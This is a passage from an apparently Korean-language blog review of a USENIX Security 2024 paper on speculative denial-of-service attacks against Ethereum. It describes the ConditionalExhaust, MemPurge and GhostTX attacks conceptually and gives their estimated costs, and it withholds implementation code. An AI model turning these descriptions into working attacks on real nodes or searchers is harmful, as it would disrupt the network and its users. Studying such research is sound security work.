src="/2025/08/25/bekim/review/ko/image1.png" alt></p><blockquote><p>Complete Overview of Decred&#x2019;s Structure [source: <a href="https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e">https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e</a>]</p></blockquote><p>&#xACF5;&#xACA9;&#xC740; &#xD06C;&#xAC8C; 2&#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB258;&#xC5B4;&#xC694;. </p><p>&#xBA3C;&#xC800; &#xBC30;&#xD3EC; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294;,&#xD2B9;&#xBCC4;&#xD788; &#xC124;&#xACC4;&#xD55C; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xC62C;&#xB9BD;&#xB2C8;&#xB2E4;(1). </p><p>&#xC774; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0;&#xB294;</p><p>1) &#xC2E4;&#xD589;&#xC790;&#xAC00; &#xAC80;&#xC5F4;&#xC790;(Censoring Validator)&#xC77C; &#xACBD;&#xC6B0;, &#xBCF5;&#xC7A1;&#xD558;&#xACE0; &#xBB34;&#xAC70;&#xC6B4; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;. (2)(3)<br>2) &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;, &#xAC04;&#xB2E8;&#xD55C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xAC00;&#xC2A4; &#xBE44;&#xC6A9;&#xB9CC; &#xBC1C;&#xC0DD;&#xD558;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><p>&#xB77C;&#xB294; &#xC870;&#xAC74;&#xBB38;&#xC774; &#xC788;&#xC5B4;&#xC694;. </p><p>&#xADF8; &#xB2E4;&#xC74C; &#xC2E4;&#xD589; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB2E4;&#xC218;&#xC758; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xD758;&#xB824;&#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xAC80;&#xC5F4;&#xC790;&#xB4E4;&#xC740; &#xB9E4;&#xBC88; CPU&#xC640;  &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xACFC;&#xC18C;&#xBE44;&#xD558;&#xBA74;&#xC11C; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xACE0;, &#xC2E4;&#xD589;&#xC774; &#xB05D;&#xB09C; &#xB4A4;&#xC5D0;&#xC57C; &#xD574;&#xB2F9; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xAC80;&#xC5F4; &#xB300;&#xC0C1; &#xC8FC;&#xC18C;(&#x3C3;)&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xAC8C; &#xB3FC;&#xC694;.(4) &#xC989;, &#xC790;&#xC6D0;&#xC740; &#xB0AD;&#xBE44;&#xB418;&#xB294;&#xB370; &#xBCF4;&#xC0C1;&#xC740; &#xBC1B;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xB418;&#xB294;&#xAC70;&#xC8E0;.</p><p>&#xC2E4;&#xC81C; &#xB17C;&#xBB38;&#xC5D0; &#xAD6C;&#xD604; &#xAC1C;&#xC694;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xD639;&#xC2DC; &#xBAA8;&#xB97C; &#xC57D;&#xAC04;&#xC758; &#xCF54;&#xB4DC; &#xC774;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAD73;&#xC774; &#xC801;&#xC9C4; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#xBBFC;. &#xC5F0;&#xAD6C;&#xC790;&#xB4E4;&#xC740; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC774; &#xAC16;&#xACE0;&#xC788;&#xB294; &#xC800;&#xC7A5;&#xC18C; &#xAD6C;&#xC870;, &#xACE0;&#xBE44;&#xC6A9; opcode &#xAC19;&#xC740; &#xD2B9;&#xC131;&#xC774;&#xB098; &#xC5EC;&#xB7EC; &#xC694;&#xC18C;&#xB97C; &#xBCC0;&#xD615;&#xC2DC;&#xCF1C; &#xC790;&#xC6D0; &#xC18C;&#xBAA8;&#xB97C; &#xADF9;&#xB300;&#xD654;&#xD558;&#xB3C4;&#xB85D; &#xCF54;&#xB4DC;&#xB97C; &#xC124;&#xACC4;&#xD588;&#xC5B4;&#xC694;.</p><p>&#xADF8; &#xACB0;&#xACFC;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC11C;&#xBA85;&#xD558;&#xB294; &#xB370; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC740; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xCD08; &#xB2E8;&#xC704;&#xC5D0; &#xBD88;&#xACFC;&#xD588;&#xC9C0;&#xB9CC;, &#xAC80;&#xC5F4;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB370;&#xB294; &#xD3C9;&#xADE0; 0.1&#xCD08;&#xAC00; &#xC18C;&#xC694;&#xB418;&#xC5B4; &#xB450; &#xC2DC;&#xAC04; &#xAC04;&#xC5D0; &#xC57D; 1,972&#xBC30;&#xC758; &#xCC28;&#xC774;&#xAC00; &#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC5D0;&#xC11C;&#xB294; &#xBE14;&#xB85D;&#xC774; 12&#xCD08; &#xB3D9;&#xC548; &#xCD5C;&#xB300; 120&#xAC1C;&#xC758; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xACF5;&#xACA9;&#xC790;&#xAC00; 140&#xAC1C;&#xC758; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB9CC; &#xBCF4;&#xB0B4;&#xB3C4; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC70;&#xB798;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xBE48; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xACF5;&#xACA9;&#xC744; &#xD558;&#xB294;&#xB370; &#xACBD;&#xC81C;&#xC801; &#xBE44;&#xC6A9;&#xB3C4; &#xD06C;&#xAC8C; &#xBD80;&#xB2F4;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xB294;&#xB370; 27&#xB2EC;&#xB7EC;( 36,000&#xC6D0;), &#xACF5;&#xACA9; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB420; &#xACBD;&#xC6B0; &#xCD5C;&#xC545;&#xC758; &#xACBD;&#xC6B0; 5.3&#xB2EC;&#xB7EC;(7,000&#xC6D0;)&#xC758; &#xBE44;&#xC6A9;&#xC774; &#xB4E4;&#xC5C8;&#xB294;&#xB370;, &#xC2E4;&#xC81C; &#xACC4;&#xC0B0;&#xD574;&#xBCF4;&#xB2C8; &#xD55C; &#xBE14;&#xB85D;&#xC5D0;&#xC11C; 140&#xAC1C;&#xC758; &#xACF5;&#xACA9; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xCD1D; &#xBE44;&#xC6A9;&#xC740; &#xC57D; 376&#xB2EC;&#xB7EC;(500,000&#xC6D0;)&#xC5D0; &#xBD88;&#xACFC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-2-The-MemPurge-Attack"><a href="#2-2-2-The-MemPurge-Attack" class="headerlink" title="2.2.2 The MemPurge Attack"></a>2.2.2 The MemPurge Attack</h3><p>&#xB450; &#xBC88;&#xC9F8;&#xB294; &#xC774;&#xB984; &#xADF8;&#xB300;&#xB85C; &#xB178;&#xB4DC;&#xC758; memool&#xC744; &#xC815;&#xB9AC;(purge)&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xB178;&#xB4DC;&#xB294; <strong>mempool</strong>&#xC774;&#xB77C;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xD5A5;&#xD6C4; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB4E4;&#xC744; &#xBCF4;&#xAD00;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACF5;&#xAC04;&#xC740; &#xC81C;&#xD55C;&#xC801;&#xC774;&#xB77C; &#xBCF4;&#xD1B5; &#xC218;&#xC218;&#xB8CC;&#xAC00; &#xB192;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC6B0;&#xC120;&#xC801;&#xC73C;&#xB85C; &#xC790;&#xB9AC;&#xC7A1;&#xB294;&#xB370;&#xC694;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xADDC;&#xCE59;&#xC744; &#xC545;&#xC6A9;&#xD574;&#xC11C; &#xC218;&#xC775;&#xC131;&#xC774; &#xB192;&#xC740; &#xC815;&#xC0C1; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; mempool&#xC5D0;&#xC11C; &#xBC00;&#xC5B4;&#xB0B4;&#xACE0;, &#xC790;&#xC2E0;&#xC758; &#xBB34;&#xC758;&#xBBF8;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC73C;&#xB85C; &#xCC44;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xACF5;&#xACA9;&#xC758; &#xD575;&#xC2EC;&#xC740; &#xC5F0;&#xC18D;&#xB41C; nonce(&#xBC88;&#xD638;)&#xB97C; &#xAC00;&#xC9C4; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xCCB4;&#xC778;(TXchain)&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/25/bekim/review/ko/image2.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): The MemPurge attack lowers the cost to evict transactions from victims&#x2019; mempools.</p></blockquote><p>1) &#xBA3C;&#xC800; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xC790;&#xAE08;&#xC744; &#xC0C8; &#xC8FC;&#xC18C;&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;(nonce=N)&#xC744; &#xB9CC;&#xB4E4;&#xACE0;, &#xADF8; &#xB4A4;&#xB85C; Nonce = N+1, N+2, &#x2026; &#xAC19;&#xC740; &#xBB34;&#xC758;&#xBBF8;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBD99;&#xC5EC; TX Chain&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.(1).<br>2) &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD6C4;&#xC18D; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xD53C;&#xD574;&#xC790; &#xB178;&#xB4DC;&#xB85C; &#xBCF4;&#xB0B4;&#xACE0;(2), Victim &#xB178;&#xB4DC;&#xB294; &#xC120;&#xD589; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC5C6;&#xB294; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xBC1B;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB4E4;&#xC744; future queue&#xC5D0; &#xC784;&#xC2DC;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;(3).<br>3) &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xCCAB; &#xBC88;&#xC9F8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;(N)&#xC744; &#xBCF4;&#xB0B4;&#xBA74;, &#xD53C;&#xD574;&#xC790; &#xB178;&#xB4DC;&#xB294; &#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xBA74;&#xC11C;, &#xC774;&#xC804; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xCCB4;&#xC778; &#xC804;&#xCCB4;&#xB97C; pending queue&#xB85C; &#xC62E;&#xAE41;&#xB2C8;&#xB2E4;. (4)<br>4) &#xD558;&#xC9C0;&#xB9CC; &#xCCAB; &#xBC88;&#xC9F8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC790;&#xAE08;&#xC740; &#xC774;&#xBBF8; &#xBE60;&#xC838;&#xB098;&#xAC14;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD6C4;&#xC18D; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB4E4;&#xC740; &#xC794;&#xC561; &#xBD80;&#xC871;&#xC73C;&#xB85C; &#xBB34;&#xD6A8;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; mempool&#xC740; &#xBB34;&#xC758;&#xBBF8;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC73C;&#xB85C; &#xCC44;&#xC6CC;&#xC9C0;&#xACE0;, &#xC6D0;&#xB798; &#xB4E4;&#xC5B4;&#xC640;&#xC788;&#xB358; &#xC218;&#xC775;&#xC131; &#xB192;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB4E4;&#xC740; &#xBC00;&#xB824;&#xB098;&#xAC8C; &#xB3FC;&#xC694;.</p><ul><li><strong>ConditionalExhaust + MemPurge</strong><br>Mempurge&#xC640; ConditionalExhaust&#xB294; &#xACB0;&#xD569;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; MemPurge &#xAC70;&#xB798;&#xC758; to &#xC8FC;&#xC18C;&#xB97C; ConditionalExhaust&#xB85C; &#xC124;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368; MemPool &#xACF5;&#xAC04;&#xC744; &#xCC28;&#xC9C0;&#xD558;&#xACE0;, ConditionalExhaust&#xB294; &#xC5F0;&#xC0B0;&#xC744; &#xC18C;&#xBAA8;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xCCAB; &#xBC88;&#xC9F8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC73C;&#xB85C; ConditionalExhaust &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xAC80;&#xC5F4;&#xC790;&#xC5D0;&#xAC8C; CPU&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC5F0;&#xC0B0; &#xBD80;&#xB2F4;&#xC744; &#xC8FC;&#xACE0;, &#xD6C4;&#xC18D; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC73C;&#xB85C; mempool &#xACF5;&#xAC04;&#xB9CC; &#xCC28;&#xC9C0;&#xD558;&#xB2E4; &#xBB34;&#xD6A8;&#xD654;&#xC2DC;&#xD0A4;&#xBA74; &#xB354; &#xAC15;&#xB825;&#xD55C; &#xACF5;&#xACA9;&#xC774; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>researcher&#xB4E4;&#xC740; &#xC774; 2&#xAC00;&#xC9C0;&#xAC00; &#xACB0;&#xD569;&#xB41C; &#xACF5;&#xACA9;&#xC744; &#xAC80;&#xC99D;&#xD588;&#xB294;&#xB370; &#xB2E8;&#xC77C; &#xACF5;&#xACA9;&#xACFC; &#xBE44;&#xAD50;&#xD588;&#xC744; &#xB54C;, &#xAC00;&#xC2A4; &#xBE44;&#xC6A9;&#xC740; &#xAC70;&#xC758; &#xB298;&#xC9C0; &#xC54A;&#xACE0; &#xD6A8;&#xACFC;&#xB294; &#xC720;&#xC9C0;&#xB41C;&#xB2E4;&#xACE0; &#xBCF4;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-3-The-GhostTX-Attack"><a href="#2-2-3-The-GhostTX-Attack" class="headerlink" title="2.2.3 The GhostTX Attack"></a>2.2.3 The GhostTX Attack</h3><p>The GhostTX Attack&#xC740; Flashbots&#xC758; PBS(Proposer-Builder Separation) &#xD658;&#xACBD;&#xC5D0;&#xC11C; Searcher&#xC758; &#xD3C9;&#xD310;(Reputation) &#xC744; &#xC9C1;&#xC811; &#xB178;&#xB9AC;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xC5D0;&#xC694;.</p><ul><li><strong>PBS</strong>&#xB294; &#xBE14;&#xB85D; &#xC81C;&#xC548;&#xC790;(Proposer)&#xC640; &#xBE4C;&#xB354;(Builder)&#xC758; &#xC5ED;&#xD560;&#xC744; &#xBD84;&#xB9AC;&#xD574;&#xC11C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD55C; &#xAD6C;&#xC870;&#xC778;&#xB370;, &#xC81C;&#xC548;&#xC790;&#xB294; &#xADF8;&#xB0E5; &#xBE14;&#xB85D;&#xC744; &#xC120;&#xD0DD;&#xD574;&#xC11C; &#xC62C;&#xB9AC;&#xACE0; &#xBE4C;&#xB354;&#xB294; &#xC218;&#xC775;&#xC131;&#xC774; &#xAC00;&#xC7A5; &#xC88B;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC870;&#xD569;(Bundles)&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xC81C;&#xC548;&#xC790;&#xC5D0;&#xAC8C; &#xC81C;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/08/25/bekim/review/ko/image3.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): Overview of Ethereum&#x2019;s PBS ecosystem actors.</p></blockquote><ul><li><strong>Flashbots</strong>&#xC740; PBS&#xC758; &#xAD6C;&#xD604;&#xCCB4;&#xB85C;, Searcher(Bundles&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xBE4C;&#xB354;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xCC38;&#xC5EC;&#xC790;)&#xC640; Builder, Proposer &#xC0AC;&#xC774;&#xB97C; &#xC5F0;&#xACB0;&#xD574;&#xC8FC;&#xB294; <strong>Relay</strong> &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD574;&#xC694;. &#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; Searcher&#xC758; &#xACFC;&#xAC70; &#xC131;&#xACFC;&#xB97C; &#xC810;&#xC218;&#xD654;&#xD55C; <strong>Reputation</strong> &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xD3C9;&#xD310;&#xC774; &#xB192;&#xC740; Searcher&#xC758; &#xBC88;&#xB4E4;&#xC774; &#xC6B0;&#xC120;&#xC801;&#xC73C;&#xB85C; &#xC120;&#xD0DD;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC5EC;&#xAE30;&#xC11C; &#xD3C9;&#xD310;&#xC740; <strong>&#xAC00;&#xC2A4; &#xB2E8;&#xC704;&#xB2F9; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xC218;&#xC775;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0C8;&#xB294;&#xC9C0;</strong>&#xB85C; &#xACC4;&#xC0B0;&#xB3FC;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xD55C; &#xBC88; &#xD3C9;&#xD310;&#xC774; &#xB5A8;&#xC5B4;&#xC9C0;&#xBA74; &#xC8FC;&#xC18C;&#xB97C; &#xBC14;&#xAFD4;&#xC11C; &#xB2E4;&#xC2DC; &#xC313;&#xC544;&#xC57C;&#xD558;&#xB294;&#xB370;, &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC758; &#xC2E0;&#xB8B0;&#xB3C4;&#xB97C; &#xB5A8;&#xC5B4;&#xB728;&#xB824; &#xC0DD;&#xD0DC;&#xACC4;&#xC5D0;&#xC11C; &#xBC00;&#xB824;&#xB0A0; &#xC218; &#xC788;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br>&#x394;T: Builder&#xC5D0;&#xAC8C; &#xC9C0;&#xAE09;&#xB41C; &#xAE08;&#xC561;, pT: &#xC218;&#xC218;&#xB8CC;, gT: &#xAC00;&#xC2A4; &#xC18C;&#xBE44;&#xB7C9;</p><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">r</span><span class="hljs-params">(U)</span> = <span class="hljs-params">(&#x2211; (&#x394;T + pT * gT)</span>) / <span class="hljs-params">(&#x2211; gT)</span></span></code></pre><p><img src="/2025/08/25/bekim/review/ko/image4.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): GhostTX&#x2019;s censorship variant exploits an inconsistency between builder and relay censorship methods</p></blockquote><p>&#xACF5;&#xACA9; &#xACFC;&#xC815;&#xC740; <strong>2&#xAC00;&#xC9C0; (Proposer Variant, Non-proposer Variant)</strong>&#xB85C; &#xB098;&#xB258;&#xB294;&#xB370; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xC790;&#xBA74; <strong>Proposer Variant</strong>&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xBE14;&#xB85D; &#xC81C;&#xC548;&#xC790;&#xC778; &#xACBD;&#xC6B0;, &#xC218;&#xC775;&#xC131;&#xC774; &#xC788;&#xC5B4;&#xBCF4;&#xC774;&#xB294; &#xBBF8;&#xB07C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBFCC;&#xB9B0; &#xB4A4; &#xCCAB; &#xBE14;&#xB85D;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xBB34;&#xD6A8;&#xD654; &#xC2DC;&#xCF1C; Searcher&#xC758; &#xD3C9;&#xD310;&#xC744; &#xAE4E;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Non-Proposer</strong>&#xC77C; &#xACBD;&#xC6B0;, Searcher&#xC758; &#xBBF8;&#xB07C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; nonce, &#xC218;&#xC218;&#xB8CC;&#xC758; &#xCDA9;&#xB3CC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD37C;&#xB728;&#xB824; &#xBE14;&#xB85D;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB9CC; &#xAE30;&#xB85D;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xAC8C; &#xB3FC;&#xC694;.</p><p>1) &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC7AC; &#xC8FC;&#xC18C;&#xB85C; &#xC790;&#xAE08;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xD615;&#xD0DC;&#xC758; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4; (1)<br>2) Searcher&#xAC00; &#xC774;&#xB97C; &#xC218;&#xC775;&#xC131; &#xC788;&#xB294; &#xAC70;&#xB798;&#xB85C; &#xD310;&#xB2E8;&#xD574; &#xBC88;&#xB4E4;&#xC5D0; &#xD3EC;&#xD568;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. (2)<br>3) Builder&#xAC00; &#xBC88;&#xB4E4;&#xC744; &#xAC80;&#xC99D;&#xD55C; &#xD6C4;(3), &#xD574;&#xB2F9; TX&#xB97C; &#xBE14;&#xB85D;&#xC5D0; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. (4)<br>4) &#xBE14;&#xB85D;&#xC740; Relay&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC9C0;&#xB9CC;, Relay&#xB294; &#xC81C;&#xC7AC; &#xC8FC;&#xC18C; &#xAD00;&#xB828; &#xAC70;&#xB798;&#xB97C; &#xAC10;&#xC9C0;&#xD558;&#xACE0; &#xBE14;&#xB85D;&#xC744; &#xD3D0;&#xAE30;&#xD558;&#xB294;&#xB370;(5), &#xADF8; &#xACB0;&#xACFC; Searcher&#xC758; &#xBC88;&#xB4E4;&#xC740; &#xBB34;&#xD6A8; &#xCC98;&#xB9AC;&#xB418;&#xACE0;, Reputation &#xC810;&#xC218;&#xAC00; &#xB0AE;&#xC544;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. (6)</p><p>GhostTX Attack&#xC740; &#xC5EC;&#xB7EC; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB294;&#xB370;, &#xADF8; &#xC911; &#xD558;&#xB098;&#xAC00; <strong>Censorhip Variant</strong> &#xC785;&#xB2C8;&#xB2E4;. Flashbots&#xC758; Builder&#xC640; Relay&#xAC00; &#xAC80;&#xC5F4;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC5D0; &#xBBF8;&#xBB18;&#xD55C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xAC74;&#xB370;&#xC694;. </p><p>Builder&#xC758; &#xB0B4;&#xBD80; &#xAC80;&#xC99D;&#xC5D0;&#xC11C;&#xB294; call &#xC5F0;&#xC0B0;&#xC790;&#xB97C; &#xC774;&#xC6A9;&#xD55C; 0 ETH &#xC1A1;&#xAE08;&#xC744; &#xC81C;&#xC7AC; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xBCF4;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC;, Relay&#xC758; &#xAC80;&#xC99D; API&#xB294; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB3C4; &#xC81C;&#xC7AC;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD574; 0 ETH&#xB97C; &#xC81C;&#xC7AC; &#xC8FC;&#xC18C;&#xB85C; &#xC1A1;&#xAE08;&#xD558;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; Searcher&#xC640; Builder&#xC5D0;&#xAC8C;&#xB294; &#xC815;&#xC0C1; &#xAC70;&#xB798;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAC8C; &#xD558;&#xACE0;, Relay &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB9CC; &#xAC78;&#xB7EC;&#xC9C0;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; Searcher&#xC758; &#xBC88;&#xB4E4;&#xC740; &#xB610;&#xB2E4;&#xC2DC; 